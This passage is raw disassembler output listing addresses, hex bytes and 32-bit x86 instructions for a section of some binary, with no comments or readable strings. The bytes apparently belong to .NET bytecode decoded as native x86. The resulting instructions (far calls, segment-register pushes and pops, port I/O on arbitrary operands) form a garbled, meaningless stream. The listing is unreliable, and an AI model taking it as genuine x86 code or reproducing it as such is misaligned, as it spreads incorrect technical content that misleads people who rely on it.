  403c09:	14 72                	adc    $0x72,%al
  403c0b:	fd                   	std
  403c0c:	09 00                	or     %eax,(%eax)
  403c0e:	70 17                	jo     0x403c27
  403c10:	8d 0a                	lea    (%edx),%ecx
  403c12:	00 00                	add    %al,(%eax)
  403c14:	01 13                	add    %edx,(%ebx)
  403c16:	44                   	inc    %esp
  403c17:	11 44 16 17          	adc    %eax,0x17(%esi,%edx,1)
  403c1b:	8c 42 00             	mov    %es,0x0(%edx)
  403c1e:	00 01                	add    %al,(%ecx)
  403c20:	a2 00 11 44 14       	mov    %al,0x14441100
  403c25:	14 28                	adc    $0x28,%al
  403c27:	75 00                	jne    0x403c29
  403c29:	00 0a                	add    %cl,(%edx)
  403c2b:	00 00                	add    %al,(%eax)
  403c2d:	00 dd                	add    %bl,%ch
  403c2f:	df 08                	fisttps (%eax)
  403c31:	00 00                	add    %al,(%eax)
  403c33:	38 57 04             	cmp    %dl,0x4(%edi)
  403c36:	00 00                	add    %al,(%eax)
  403c38:	00 11                	add    %dl,(%ecx)
  403c3a:	49                   	dec    %ecx
  403c3b:	72 05                	jb     0x403c42
  403c3d:	0a 00                	or     (%eax),%al
  403c3f:	70 16                	jo     0x403c57
  403c41:	28 32                	sub    %dh,(%edx)
  403c43:	00 00                	add    %al,(%eax)
  403c45:	0a 16                	or     (%esi),%dl
  403c47:	fe 01                	incb   (%ecx)
  403c49:	13 50 11             	adc    0x11(%eax),%edx
  403c4c:	50                   	push   %eax
  403c4d:	39 ba 01 00 00 00    	cmp    %edi,0x1(%edx)
  403c53:	06                   	push   %es
  403c54:	17                   	pop    %ss
  403c55:	9a 16 8d 1c 00 00 01 	lcall  $0x100,$0x1c8d16
  403c5c:	28 25 00 00 06 74    	sub    %ah,0x74060000
  403c62:	08 00                	or     %al,(%eax)
  403c64:	00 1b                	add    %bl,(%ebx)
  403c66:	13 23                	adc    (%ebx),%esp
  403c68:	06                   	push   %es
  403c69:	18 9a 6f 2b 00 00    	sbb    %bl,0x2b6f(%edx)
  403c6f:	0a 1f                	or     (%edi),%bl
  403c71:	0a fe                	or     %dh,%bh
  403c73:	04 11                	add    $0x11,%al
  403c75:	23 8e b7 16 fe 01    	and    0x1fe16b7(%esi),%ecx
  403c7b:	5f                   	pop    %edi
  403c7c:	13 50 11             	adc    0x11(%eax),%edx
  403c7f:	50                   	push   %eax
  403c80:	2c 4b                	sub    $0x4b,%al
  403c82:	1b 8d 23 00 00 01    	sbb    0x1000023(%ebp),%ecx
  403c88:	13 41 11             	adc    0x11(%ecx),%eax
  403c8b:	41                   	inc    %ecx
  403c8c:	16                   	push   %ss
  403c8d:	72 cf                	jb     0x403c5e
  403c8f:	09 00                	or     %eax,(%eax)
  403c91:	70 a2                	jo     0x403c35
  403c93:	00 11                	add    %dl,(%ecx)
  403c95:	41                   	inc    %ecx
  403c96:	17                   	pop    %ss
  403c97:	7e 24                	jle    0x403cbd
  403c99:	00 00                	add    %al,(%eax)
  403c9b:	04 a2                	add    $0xa2,%al
  403c9d:	00 11                	add    %dl,(%ecx)
  403c9f:	41                   	inc    %ecx
  403ca0:	18 06                	sbb    %al,(%esi)
  403ca2:	17                   	pop    %ss
  403ca3:	9a a2 00 11 41 19 7e 	lcall  $0x7e19,$0x411100a2
  403caa:	24 00                	and    $0x0,%al
  403cac:	00 04 a2             	add    %al,(%edx,%eiz,4)
  403caf:	00 11                	add    %dl,(%ecx)
  403cb1:	41                   	inc    %ecx
  403cb2:	1a 17                	sbb    (%edi),%dl
  403cb4:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  403cb8:	0a a2 00 11 41 28    	or     0x28411100(%edx),%ah
  403cbe:	44                   	inc    %esp
  403cbf:	00 00                	add    %al,(%eax)
  403cc1:	0a 28                	or     (%eax),%ch
  403cc3:	39 00                	cmp    %eax,(%eax)
  403cc5:	00 06                	add    %al,(%esi)
  403cc7:	26 38 33             	cmp    %dh,%es:(%ebx)
  403cca:	01 00                	add    %eax,(%eax)
  403ccc:	00 00                	add    %al,(%eax)
  403cce:	06                   	push   %es
  403ccf:	18 9a 6f 2b 00 00    	sbb    %bl,0x2b6f(%edx)
  403cd5:	0a 1f                	or     (%edi),%bl
  403cd7:	0a fe                	or     %dh,%bh
  403cd9:	02 13                	add    (%ebx),%dl
  403cdb:	50                   	push   %eax
  403cdc:	11 50 2c             	adc    %edx,0x2c(%eax)
  403cdf:	4e                   	dec    %esi
  403ce0:	73 26                	jae    0x403d08
  403ce2:	00 00                	add    %al,(%eax)
  403ce4:	0a 13                	or     (%ebx),%dl
  403ce6:	26 06                	es push %es
  403ce8:	16                   	push   %ss
  403ce9:	9a 7e 24 00 00 04 06 	lcall  $0x604,$0x247e
  403cf0:	17                   	pop    %ss
  403cf1:	9a 7e 24 00 00 04 28 	lcall  $0x2804,$0x247e
  403cf8:	6c                   	insb   (%dx),%es:(%edi)
  403cf9:	00 00                	add    %al,(%eax)
  403cfb:	0a 6f 2b             	or     0x2b(%edi),%ch
  403cfe:	00 00                	add    %al,(%eax)
  403d00:	0a 13                	or     (%ebx),%dl
  403d02:	25 11 26 02 11       	and    $0x11022611,%eax
  403d07:	25 02 8e b7 11       	and    $0x11b78e02,%eax
  403d0c:	25 da 6f 6f 00       	and    $0x6f6fda,%eax
  403d11:	00 0a                	add    %cl,(%edx)
  403d13:	00 11                	add    %dl,(%ecx)
  403d15:	26 6f                	outsl  %es:(%esi),(%dx)
  403d17:	70 00                	jo     0x403d19
  403d19:	00 0a                	add    %cl,(%edx)
  403d1b:	28 3d 00 00 06 13    	sub    %bh,0x13060000
  403d21:	23 06                	and    (%esi),%eax
  403d23:	17                   	pop    %ss
  403d24:	9a 11 23 19 28 3b 00 	lcall  $0x3b,$0x28192311
  403d2b:	00 06                	add    %al,(%esi)
  403d2d:	26 00 1b             	add    %bl,%es:(%ebx)
  403d30:	8d 23                	lea    (%ebx),%esp
  403d32:	00 00                	add    %al,(%eax)
  403d34:	01 13                	add    %edx,(%ebx)
  403d36:	41                   	inc    %ecx
  403d37:	11 41 16             	adc    %eax,0x16(%ecx)
  403d3a:	72 cf                	jb     0x403d0b
  403d3c:	09 00                	or     %eax,(%eax)
  403d3e:	70 a2                	jo     0x403ce2
  403d40:	00 11                	add    %dl,(%ecx)
  403d42:	41                   	inc    %ecx
  403d43:	17                   	pop    %ss
  403d44:	7e 24                	jle    0x403d6a
  403d46:	00 00                	add    %al,(%eax)
  403d48:	04 a2                	add    $0xa2,%al
  403d4a:	00 11                	add    %dl,(%ecx)
  403d4c:	41                   	inc    %ecx
  403d4d:	18 06                	sbb    %al,(%esi)
  403d4f:	17                   	pop    %ss
  403d50:	9a a2 00 11 41 19 7e 	lcall  $0x7e19,$0x411100a2
  403d57:	24 00                	and    $0x0,%al
  403d59:	00 04 a2             	add    %al,(%edx,%eiz,4)
  403d5c:	00 11                	add    %dl,(%ecx)
  403d5e:	41                   	inc    %ecx
  403d5f:	1a 16                	sbb    (%esi),%dl
  403d61:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  403d65:	0a a2 00 11 41 28    	or     0x28411100(%edx),%ah
  403d6b:	44                   	inc    %esp
  403d6c:	00 00                	add    %al,(%eax)
  403d6e:	0a 28                	or     (%eax),%ch
  403d70:	39 00                	cmp    %eax,(%eax)
  403d72:	00 06                	add    %al,(%esi)
  403d74:	26 11 23             	adc    %esp,%es:(%ebx)
  403d77:	72 d5                	jb     0x403d4e
  403d79:	09 00                	or     %eax,(%eax)
  403d7b:	70 28                	jo     0x403da5
  403d7d:	35 00 00 06 28       	xor    $0x28060000,%eax
  403d82:	0c 00                	or     $0x0,%al
  403d84:	00 0a                	add    %cl,(%edx)
  403d86:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  403d89:	00 0a                	add    %cl,(%edx)
  403d8b:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  403d8e:	00 0a                	add    %cl,(%edx)
  403d90:	13 24 1b             	adc    (%ebx,%ebx,1),%esp
  403d93:	8d 23                	lea    (%ebx),%esp
  403d95:	00 00                	add    %al,(%eax)
  403d97:	01 13                	add    %edx,(%ebx)
  403d99:	41                   	inc    %ecx
  403d9a:	11 41 16             	adc    %eax,0x16(%ecx)
  403d9d:	72 05                	jb     0x403da4
  403d9f:	0a 00                	or     (%eax),%al
  403da1:	70 a2                	jo     0x403d45
  403da3:	00 11                	add    %dl,(%ecx)
  403da5:	41                   	inc    %ecx
  403da6:	17                   	pop    %ss
  403da7:	7e 24                	jle    0x403dcd
  403da9:	00 00                	add    %al,(%eax)
  403dab:	04 a2                	add    $0xa2,%al
  403dad:	00 11                	add    %dl,(%ecx)
  403daf:	41                   	inc    %ecx
  403db0:	18 06                	sbb    %al,(%esi)
  403db2:	17                   	pop    %ss
  403db3:	9a a2 00 11 41 19 7e 	lcall  $0x7e19,$0x411100a2
  403dba:	24 00                	and    $0x0,%al
  403dbc:	00 04 a2             	add    %al,(%edx,%eiz,4)
  403dbf:	00 11                	add    %dl,(%ecx)
  403dc1:	41                   	inc    %ecx
  403dc2:	1a 11                	sbb    (%ecx),%dl
  403dc4:	24 28                	and    $0x28,%al
  403dc6:	0c 00                	or     $0x0,%al
  403dc8:	00 0a                	add    %cl,(%edx)
  403dca:	14 72                	adc    $0x72,%al
  403dcc:	0d 0a 00 70 16       	or     $0x1670000a,%eax
  403dd1:	8d 0a                	lea    (%edx),%ecx
  403dd3:	00 00                	add    %al,(%eax)
  403dd5:	01 14 14             	add    %edx,(%esp,%edx,1)
  403dd8:	14 28                	adc    $0x28,%al
  403dda:	76 00                	jbe    0x403ddc
  403ddc:	00 0a                	add    %cl,(%edx)
  403dde:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  403de1:	00 0a                	add    %cl,(%edx)
  403de3:	28 22                	sub    %ah,(%edx)
  403de5:	00 00                	add    %al,(%eax)
  403de7:	0a 13                	or     (%ebx),%dl
  403de9:	47                   	inc    %edi
  403dea:	12 47 28             	adc    0x28(%edi),%al
  403ded:	24 00                	and    $0x0,%al
  403def:	00 06                	add    %al,(%esi)
  403df1:	a2 00 11 41 28       	mov    %al,0x28411100
  403df6:	44                   	inc    %esp
  403df7:	00 00                	add    %al,(%eax)
  403df9:	0a 28                	or     (%eax),%ch
  403dfb:	39 00                	cmp    %eax,(%eax)
  403dfd:	00 06                	add    %al,(%esi)
  403dff:	26 00 00             	add    %al,%es:(%eax)
  403e02:	dd 0b                	fisttpll (%ebx)
  403e04:	07                   	pop    %es
  403e05:	00 00                	add    %al,(%eax)
  403e07:	38 83 02 00 00 00    	cmp    %al,0x2(%ebx)
  403e0d:	11 49 72             	adc    %ecx,0x72(%ecx)
  403e10:	13 0a                	adc    (%edx),%ecx
  403e12:	00 70 16             	add    %dh,0x16(%eax)
  403e15:	28 32                	sub    %dh,(%edx)
  403e17:	00 00                	add    %al,(%eax)
  403e19:	0a 16                	or     (%esi),%dl
  403e1b:	fe 01                	incb   (%ecx)
  403e1d:	13 50 11             	adc    0x11(%eax),%edx
  403e20:	50                   	push   %eax
  403e21:	39 bc 01 00 00 00 28 	cmp    %edi,0x28000000(%ecx,%eax,1)
  403e28:	7a 00                	jp     0x403e2a
  403e2a:	00 0a                	add    %cl,(%edx)
  403e2c:	6f                   	outsl  %ds:(%esi),(%dx)
  403e2d:	7b 00                	jnp    0x403e2f
  403e2f:	00 0a                	add    %cl,(%edx)
  403e31:	13 29                	adc    (%ecx),%ebp
  403e33:	28 7a 00             	sub    %bh,0x0(%edx)
  403e36:	00 0a                	add    %cl,(%edx)
  403e38:	6f                   	outsl  %ds:(%esi),(%dx)
  403e39:	7b 00                	jnp    0x403e3b
  403e3b:	00 0a                	add    %cl,(%edx)
  403e3d:	13 4d 12             	adc    0x12(%ebp),%ecx
  403e40:	4d                   	dec    %ebp
  403e41:	28 7c 00 00          	sub    %bh,0x0(%eax,%eax,1)
  403e45:	0a 12                	or     (%edx),%dl
  403e47:	29 28                	sub    %ebp,(%eax)
  403e49:	7d 00                	jge    0x403e4b
  403e4b:	00 0a                	add    %cl,(%edx)
  403e4d:	20 05 10 02 00 73    	and    %al,0x73000210
  403e53:	7e 00                	jle    0x403e55
  403e55:	00 0a                	add    %cl,(%edx)
  403e57:	13 2b                	adc    (%ebx),%ebp
  403e59:	11 2b                	adc    %ebp,(%ebx)
  403e5b:	28 7f 00             	sub    %bh,0x0(%edi)
  403e5e:	00 0a                	add    %cl,(%edx)
  403e60:	13 2a                	adc    (%edx),%ebp
  403e62:	12 28                	adc    (%eax),%ch
  403e64:	11 2b                	adc    %ebp,(%ebx)
  403e66:	6f                   	outsl  %ds:(%esi),(%dx)
  403e67:	80 00 00             	addb   $0x0,(%eax)
  403e6a:	0a 11                	or     (%ecx),%dl
  403e6c:	2b 6f 81             	sub    -0x7f(%edi),%ebp
  403e6f:	00 00                	add    %al,(%eax)
  403e71:	0a 28                	or     (%eax),%ch
  403e73:	82 00 00             	addb   $0x0,(%eax)
  403e76:	0a 00                	or     (%eax),%al
  403e78:	11 2a                	adc    %ebp,(%edx)
  403e7a:	16                   	push   %ss
  403e7b:	16                   	push   %ss
  403e7c:	16                   	push   %ss
  403e7d:	16                   	push   %ss
  403e7e:	11 28                	adc    %ebp,(%eax)
  403e80:	20 20                	and    %ah,(%eax)
  403e82:	00 cc                	add    %cl,%ah
  403e84:	00 6f 83             	add    %ch,-0x7d(%edi)
  403e87:	00 00                	add    %al,(%eax)
  403e89:	0a 00                	or     (%eax),%al
  403e8b:	00 12                	add    %dl,(%edx)
  403e8d:	28 1f                	sub    %bl,(%edi)
  403e8f:	20 1f                	and    %bl,(%edi)
  403e91:	20 28                	and    %ch,(%eax)
  403e93:	82 00 00             	addb   $0x0,(%eax)
  403e96:	0a 00                	or     (%eax),%al
  403e98:	12 29                	adc    (%ecx),%ch
  403e9a:	28 84 00 00 0a 11 28 	sub    %al,0x28110a00(%eax,%eax,1)
  403ea1:	28 85 00 00 0a 00    	sub    %al,0xa0000(%ebp)
  403ea7:	28 86 00 00 0a 11    	sub    %al,0x110a0000(%esi)
  403ead:	2a 11                	sub    (%ecx),%dl
  403eaf:	29 6f 87             	sub    %ebp,-0x79(%edi)
  403eb2:	00 00                	add    %al,(%eax)
  403eb4:	0a 00                	or     (%eax),%al
  403eb6:	de 10                	ficoms (%eax)
  403eb8:	25 28 2c 00 00       	and    $0x2c28,%eax
  403ebd:	0a 13                	or     (%ebx),%dl
  403ebf:	2f                   	das
  403ec0:	00 28                	add    %ch,(%eax)
  403ec2:	2d 00 00 0a de       	sub    $0xde0a0000,%eax
  403ec7:	00 00                	add    %al,(%eax)
  403ec9:	11 2a                	adc    %ebp,(%edx)
  403ecb:	6f                   	outsl  %ds:(%esi),(%dx)
  403ecc:	88 00                	mov    %al,(%eax)
  403ece:	00 0a                	add    %cl,(%edx)
  403ed0:	00 06                	add    %al,(%esi)
  403ed2:	17                   	pop    %ss
  403ed3:	9a 28 40 00 00 0a 06 	lcall  $0x60a,$0x4028
  403eda:	18 9a 28 40 00 00    	sbb    %bl,0x4028(%edx)
  403ee0:	0a 73 89             	or     -0x77(%ebx),%dh
  403ee3:	00 00                	add    %al,(%eax)
  403ee5:	0a 13                	or     (%ebx),%dl
  403ee7:	27                   	daa
  403ee8:	11 27                	adc    %esp,(%edi)
  403eea:	28 7f 00             	sub    %bh,0x0(%edi)
  403eed:	00 0a                	add    %cl,(%edx)
  403eef:	13 2a                	adc    (%edx),%ebp
  403ef1:	11 2a                	adc    %ebp,(%edx)
  403ef3:	11 2b                	adc    %ebp,(%ebx)
  403ef5:	16                   	push   %ss
  403ef6:	16                   	push   %ss
  403ef7:	11 27                	adc    %esp,(%edi)
  403ef9:	6f                   	outsl  %ds:(%esi),(%dx)
  403efa:	80 00 00             	addb   $0x0,(%eax)
  403efd:	0a 11                	or     (%ecx),%dl
  403eff:	27                   	daa
  403f00:	6f                   	outsl  %ds:(%esi),(%dx)
  403f01:	81 00 00 0a 6f 8a    	addl   $0x8a6f0a00,(%eax)
  403f07:	00 00                	add    %al,(%eax)
  403f09:	0a 00                	or     (%eax),%al
  403f0b:	11 2a                	adc    %ebp,(%edx)
  403f0d:	6f                   	outsl  %ds:(%esi),(%dx)
  403f0e:	88 00                	mov    %al,(%eax)
  403f10:	00 0a                	add    %cl,(%edx)
  403f12:	00 73 26             	add    %dh,0x26(%ebx)
  403f15:	00 00                	add    %al,(%eax)
  403f17:	0a 13                	or     (%ebx),%dl
  403f19:	2d 72 13 0a 00       	sub    $0xa1372,%eax
  403f1e:	70 7e                	jo     0x403f9e
  403f20:	24 00                	and    $0x0,%al
  403f22:	00 04 28             	add    %al,(%eax,%ebp,1)
  403f25:	4a                   	dec    %edx
  403f26:	00 00                	add    %al,(%eax)
  403f28:	0a 13                	or     (%ebx),%dl
  403f2a:	47                   	inc    %edi
  403f2b:	12 47 28             	adc    0x28(%edi),%al
  403f2e:	38 00                	cmp    %al,(%eax)
  403f30:	00 06                	add    %al,(%esi)
  403f32:	10 00                	adc    %al,(%eax)
  403f34:	11 2d 02 16 02 8e    	adc    %ebp,0x8e021602
  403f3a:	b7 6f                	mov    $0x6f,%bh
  403f3c:	6f                   	outsl  %ds:(%esi),(%dx)
  403f3d:	00 00                	add    %al,(%eax)
  403f3f:	0a 00                	or     (%eax),%al
  403f41:	73 26                	jae    0x403f69
  403f43:	00 00                	add    %al,(%eax)
  403f45:	0a 13                	or     (%ebx),%dl
  403f47:	2e 11 27             	adc    %esp,%cs:(%edi)
  403f4a:	11 2e                	adc    %ebp,(%esi)
  403f4c:	28 8b 00 00 0a 6f    	sub    %cl,0x6f0a0000(%ebx)
  403f52:	8c 00                	mov    %es,(%eax)
  403f54:	00 0a                	add    %cl,(%edx)
  403f56:	00 11                	add    %dl,(%ecx)
  403f58:	2e 6f                	outsl  %cs:(%esi),(%dx)
  403f5a:	70 00                	jo     0x403f5c
  403f5c:	00 0a                	add    %cl,(%edx)
  403f5e:	28 33                	sub    %dh,(%ebx)
  403f60:	00 00                	add    %al,(%eax)
  403f62:	06                   	push   %es
  403f63:	13 2c 11             	adc    (%ecx,%edx,1),%ebp
  403f66:	2c 7e                	sub    $0x7e,%al
  403f68:	18 00                	sbb    %al,(%eax)
  403f6a:	00 04 16             	add    %al,(%esi,%edx,1)
  403f6d:	28 32                	sub    %dh,(%edx)
  403f6f:	00 00                	add    %al,(%eax)
  403f71:	0a 16                	or     (%esi),%dl
  403f73:	fe 01                	incb   (%ecx)
  403f75:	16                   	push   %ss
  403f76:	fe 01                	incb   (%ecx)
  403f78:	13 50 11             	adc    0x11(%eax),%edx
  403f7b:	50                   	push   %eax
  403f7c:	2c 21                	sub    $0x21,%al
  403f7e:	11 2c 80             	adc    %ebp,(%eax,%eax,4)
  403f81:	18 00                	sbb    %al,(%eax)
  403f83:	00 04 11             	add    %al,(%ecx,%edx,1)
  403f86:	2d 11 2e 6f 70       	sub    $0x706f2e11,%eax
  403f8b:	00 00                	add    %al,(%eax)
  403f8d:	0a 16                	or     (%esi),%dl
  403f8f:	11 2e                	adc    %ebp,(%esi)
  403f91:	6f                   	outsl  %ds:(%esi),(%dx)
  403f92:	8d 00                	lea    (%eax),%eax
  403f94:	00 0a                	add    %cl,(%edx)
  403f96:	b7 6f                	mov    $0x6f,%bh
  403f98:	6f                   	outsl  %ds:(%esi),(%dx)
  403f99:	00 00                	add    %al,(%eax)
  403f9b:	0a 00                	or     (%eax),%al
  403f9d:	2b 0a                	sub    (%edx),%ecx
  403f9f:	00 11                	add    %dl,(%ecx)
  403fa1:	2d 16 6f 8e 00       	sub    $0x8e6f16,%eax
  403fa6:	00 0a                	add    %cl,(%edx)
  403fa8:	00 00                	add    %al,(%eax)
  403faa:	11 2d 6f 70 00 00    	adc    %ebp,0x706f
  403fb0:	0a 28                	or     (%eax),%ch
  403fb2:	3a 00                	cmp    (%eax),%al
  403fb4:	00 06                	add    %al,(%esi)
  403fb6:	26 11 2d 6f 39 00 00 	adc    %ebp,%es:0x396f
  403fbd:	0a 00                	or     (%eax),%al
  403fbf:	11 2e                	adc    %ebp,(%esi)
  403fc1:	6f                   	outsl  %ds:(%esi),(%dx)
  403fc2:	39 00                	cmp    %eax,(%eax)
  403fc4:	00 0a                	add    %cl,(%edx)
  403fc6:	00 11                	add    %dl,(%ecx)
  403fc8:	2b 6f 8f             	sub    -0x71(%edi),%ebp
  403fcb:	00 00                	add    %al,(%eax)
  403fcd:	0a 00                	or     (%eax),%al
  403fcf:	11 27                	adc    %esp,(%edi)
  403fd1:	6f                   	outsl  %ds:(%esi),(%dx)
  403fd2:	8f 00                	pop    (%eax)
  403fd4:	00 0a                	add    %cl,(%edx)
  403fd6:	00 00                	add    %al,(%eax)
  403fd8:	dd 35 05 00 00 38    	fnsave 0x38000005
  403fde:	ad                   	lods   %ds:(%esi),%eax
  403fdf:	00 00                	add    %al,(%eax)
  403fe1:	00 00                	add    %al,(%eax)
  403fe3:	11 49 72             	adc    %ecx,0x72(%ecx)
  403fe6:	1b 0a                	sbb    (%edx),%ecx
  403fe8:	00 70 16             	add    %dh,0x16(%eax)
  403feb:	28 32                	sub    %dh,(%edx)
  403fed:	00 00                	add    %al,(%eax)
  403fef:	0a 16                	or     (%esi),%dl
  403ff1:	fe 01                	incb   (%ecx)
  403ff3:	13 50 11             	adc    0x11(%eax),%edx
  403ff6:	50                   	push   %eax
  403ff7:	39 93 00 00 00 00    	cmp    %edx,0x0(%ebx)
  403ffd:	00 06                	add    %al,(%esi)
  403fff:	17                   	pop    %ss
  404000:	9a 13 4e 00 11 4e 72 	lcall  $0x724e,$0x11004e13
  404007:	1d 09 00 70 16       	sbb    $0x16700009,%eax
  40400c:	28 32                	sub    %dh,(%edx)
  40400e:	00 00                	add    %al,(%eax)
  404010:	0a 16                	or     (%esi),%dl
  404012:	fe 01                	incb   (%ecx)
  404014:	13 4f 11             	adc    0x11(%edi),%ecx
  404017:	4f                   	dec    %edi
  404018:	2c 0c                	sub    $0xc,%al
  40401a:	00 28                	add    %ch,(%eax)
  40401c:	3c 00                	cmp    $0x0,%al
  40401e:	00 06                	add    %al,(%esi)
  404020:	00 00                	add    %al,(%eax)
  404022:	2b 64 2b 62          	sub    0x62(%ebx,%ebp,1),%esp
  404026:	00 11                	add    %dl,(%ecx)
  404028:	4e                   	dec    %esi
  404029:	72 21                	jb     0x40404c
  40402b:	09 00                	or     %eax,(%eax)
  40402d:	70 16                	jo     0x404045
  40402f:	28 32                	sub    %dh,(%edx)
  404031:	00 00                	add    %al,(%eax)
  404033:	0a 16                	or     (%esi),%dl
  404035:	fe 01                	incb   (%ecx)
  404037:	13 50 11             	adc    0x11(%eax),%edx
  40403a:	50                   	push   %eax
  40403b:	2c 13                	sub    $0x13,%al
  40403d:	00 16                	add    %dl,(%esi)
  40403f:	28 36                	sub    %dh,(%esi)
  404041:	00 00                	add    %al,(%eax)
  404043:	06                   	push   %es
  404044:	00 28                	add    %ch,(%eax)
  404046:	90                   	nop
  404047:	00 00                	add    %al,(%eax)
  404049:	0a 00                	or     (%eax),%al
  40404b:	00 2b                	add    %ch,(%ebx)
  40404d:	3a 2b                	cmp    (%ebx),%ch
  40404f:	38 00                	cmp    %al,(%eax)
  404051:	11 4e 72             	adc    %ecx,0x72(%esi)
  404054:	37                   	aaa
  404055:	09 00                	or     %eax,(%eax)
  404057:	70 16                	jo     0x40406f
  404059:	28 32                	sub    %dh,(%edx)
  40405b:	00 00                	add    %al,(%eax)
  40405d:	0a 16                	or     (%esi),%dl
  40405f:	fe 01                	incb   (%ecx)
  404061:	13 50 11             	adc    0x11(%eax),%edx
  404064:	50                   	push   %eax
  404065:	2c 21                	sub    $0x21,%al
  404067:	00 16                	add    %dl,(%esi)
  404069:	28 36                	sub    %dh,(%esi)
  40406b:	00 00                	add    %al,(%eax)
  40406d:	06                   	push   %es
  40406e:	00 7e 19             	add    %bh,0x19(%esi)
  404071:	00 00                	add    %al,(%eax)
  404073:	04 6f                	add    $0x6f,%al
  404075:	91                   	xchg   %eax,%ecx
  404076:	00 00                	add    %al,(%eax)
  404078:	0a 28                	or     (%eax),%ch
  40407a:	55                   	push   %ebp
  40407b:	00 00                	add    %al,(%eax)
  40407d:	0a 26                	or     (%esi),%ah
  40407f:	28 90 00 00 0a 00    	sub    %dl,0xa0000(%eax)
  404085:	00 2b                	add    %ch,(%ebx)
  404087:	00 00                	add    %al,(%eax)
  404089:	00 dd                	add    %bl,%ch
  40408b:	83 04 00 00          	addl   $0x0,(%eax,%eax,1)
  40408f:	00 11                	add    %dl,(%ecx)
  404091:	07                   	pop    %es
  404092:	72 21                	jb     0x4040b5
  404094:	0a 00                	or     (%eax),%al
  404096:	70 16                	jo     0x4040ae
  404098:	28 32                	sub    %dh,(%edx)
  40409a:	00 00                	add    %al,(%eax)
  40409c:	0a 16                	or     (%esi),%dl
  40409e:	fe 01                	incb   (%ecx)
  4040a0:	16                   	push   %ss
  4040a1:	fe 01                	incb   (%ecx)
  4040a3:	13 50 11             	adc    0x11(%eax),%edx
  4040a6:	50                   	push   %eax
  4040a7:	2c 05                	sub    $0x5,%al
  4040a9:	38 b1 01 00 00 00    	cmp    %dh,0x1(%ecx)
  4040af:	14 0c                	adc    $0xc,%al
  4040b1:	06                   	push   %es
  4040b2:	17                   	pop    %ss
  4040b3:	9a 16 6f 6e 00 00 0a 	lcall  $0xa00,$0x6e6f16
  4040ba:	1f                   	pop    %ds
  4040bb:	1f                   	pop    %ds
  4040bc:	fe 01                	incb   (%ecx)
  4040be:	13 50 11             	adc    0x11(%eax),%edx
  4040c1:	50                   	push   %eax
  4040c2:	39 83 00 00 00 00    	cmp    %eax,0x0(%ebx)
  4040c8:	73 26                	jae    0x4040f0
  4040ca:	00 00                	add    %al,(%eax)
  4040cc:	0a 13                	or     (%ebx),%dl
  4040ce:	31 06                	xor    %eax,(%esi)
  4040d0:	16                   	push   %ss
  4040d1:	9a 7e 24 00 00 04 28 	lcall  $0x2804,$0x247e
  4040d8:	4a                   	dec    %edx
  4040d9:	00 00                	add    %al,(%eax)
  4040db:	0a 6f 2b             	or     0x2b(%edi),%ch
  4040de:	00 00                	add    %al,(%eax)
  4040e0:	0a 13                	or     (%ebx),%dl
  4040e2:	30 11                	xor    %dl,(%ecx)
  4040e4:	31 02                	xor    %eax,(%edx)
  4040e6:	11 30                	adc    %esi,(%eax)
  4040e8:	02 8e b7 11 30 da    	add    -0x25cfee49(%esi),%cl
  4040ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4040ef:	6f                   	outsl  %ds:(%esi),(%dx)
  4040f0:	00 00                	add    %al,(%eax)
  4040f2:	0a 00                	or     (%eax),%al
  4040f4:	11 31                	adc    %esi,(%ecx)
  4040f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4040f7:	70 00                	jo     0x4040f9
  4040f9:	00 0a                	add    %cl,(%edx)
  4040fb:	28 3d 00 00 06 0c    	sub    %bh,0xc060000
  404101:	00 dd                	add    %bl,%ch
  404103:	9b                   	fwait
  404104:	00 00                	add    %al,(%eax)
  404106:	00 de                	add    %bl,%dh
  404108:	40                   	inc    %eax
  404109:	25 28 2c 00 00       	and    $0x2c28,%eax
  40410e:	0a 13                	or     (%ebx),%dl
  404110:	32 00                	xor    (%eax),%al
  404112:	72 41                	jb     0x404155
  404114:	09 00                	or     %eax,(%eax)
  404116:	70 7e                	jo     0x404196
  404118:	24 00                	and    $0x0,%al
  40411a:	00 04 72             	add    %al,(%edx,%esi,2)
  40411d:	27                   	daa
  40411e:	0a 00                	or     (%eax),%al
  404120:	70 28                	jo     0x40414a
  404122:	43                   	inc    %ebx
  404123:	00 00                	add    %al,(%eax)
  404125:	0a 28                	or     (%eax),%ch
  404127:	39 00                	cmp    %eax,(%eax)
  404129:	00 06                	add    %al,(%esi)
  40412b:	26 72 65             	es jb  0x404193
  40412e:	09 00                	or     %eax,(%eax)
  404130:	70 28                	jo     0x40415a
  404132:	39 00                	cmp    %eax,(%eax)
  404134:	00 06                	add    %al,(%esi)
  404136:	26 00 28             	add    %ch,%es:(%eax)
  404139:	2d 00 00 0a dd       	sub    $0xdd0a0000,%eax
  40413e:	d0 03                	rolb   $1,(%ebx)
  404140:	00 00                	add    %al,(%eax)
  404142:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  404148:	00 00                	add    %al,(%eax)
  40414a:	00 73 69             	add    %dh,0x69(%ebx)
  40414d:	00 00                	add    %al,(%eax)
  40414f:	0a 13                	or     (%ebx),%dl
  404151:	04 00                	add    $0x0,%al
  404153:	11 04 06             	adc    %eax,(%esi,%eax,1)
  404156:	17                   	pop    %ss
  404157:	9a 6f 71 00 00 0a 0c 	lcall  $0xc0a,$0x716f
  40415e:	de 40 25             	fiadds 0x25(%eax)
  404161:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  404164:	00 0a                	add    %cl,(%edx)
  404166:	13 33                	adc    (%ebx),%esi
  404168:	00 72 41             	add    %dh,0x41(%edx)
  40416b:	09 00                	or     %eax,(%eax)
  40416d:	70 7e                	jo     0x4041ed
  40416f:	24 00                	and    $0x0,%al
  404171:	00 04 72             	add    %al,(%edx,%esi,2)
  404174:	27                   	daa
  404175:	0a 00                	or     (%eax),%al
  404177:	70 28                	jo     0x4041a1
  404179:	43                   	inc    %ebx
  40417a:	00 00                	add    %al,(%eax)
  40417c:	0a 28                	or     (%eax),%ch
  40417e:	39 00                	cmp    %eax,(%eax)
  404180:	00 06                	add    %al,(%esi)
  404182:	26 72 65             	es jb  0x4041ea
  404185:	09 00                	or     %eax,(%eax)
  404187:	70 28                	jo     0x4041b1
  404189:	39 00                	cmp    %eax,(%eax)
  40418b:	00 06                	add    %al,(%esi)
